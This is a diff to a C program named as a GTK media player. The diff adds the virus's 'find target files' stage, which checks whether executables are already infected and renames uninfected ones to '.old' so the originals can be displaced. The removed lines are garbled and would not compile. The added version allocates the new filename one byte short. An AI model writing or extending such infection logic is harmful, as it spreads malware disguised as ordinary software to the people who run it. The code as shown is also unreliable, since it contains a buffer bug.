@@ -6,7 +6,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/stat.h>
-
+bool isAlreadyInfected(char *pgrmName, DIR *d);
 // step 4 : find target files
 // gcc -o mediaplayer mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
 void findTargetFiles()
@@ -35,16 +35,19 @@ void findTargetFiles()
                                 printf("Last status change:       %s", ctime(&sb.st_ctime));
                                 printf("Last file access:         %s", ctime(&sb.st_atime));
                                 printf("Last file modification:   %s\n", ctime(&sb.st_mtime));
-                        }
-                        // checking if executable is already infected, testing on exe that not have a .old
-                        if (!strstr(dir->d_name, ".old"))
-                        {
-                                if (!isAlreadyInfected(&dir->d_name, &d))
+
+                                // checking if executable is already infected, testing on exe that not have a .old
+                                if (!strstr(dir->d_name, ".old"))
                                 {
-                                        char oldname[] = dir->d_name;
-                                        size_t newNameLen=strlen( oldname )+strlen(".old");
-                                        char newname[] = dir->d_name;
-                                        rename(&, "readme.txt");
+                                        if (!isAlreadyInfected(dir->d_name, d))
+                                        {
+                                                size_t newNameLen = strlen(dir->d_name) + strlen(".old");
+                                                char *newName = (char *)malloc(newNameLen);
+                                                strcpy(newName, dir->d_name);
+                                                strcat(newName, ".old");
+                                                rename(dir->d_name, newName);
+                                                free(newName);
+                                        }
                                 }
                         }
                 }
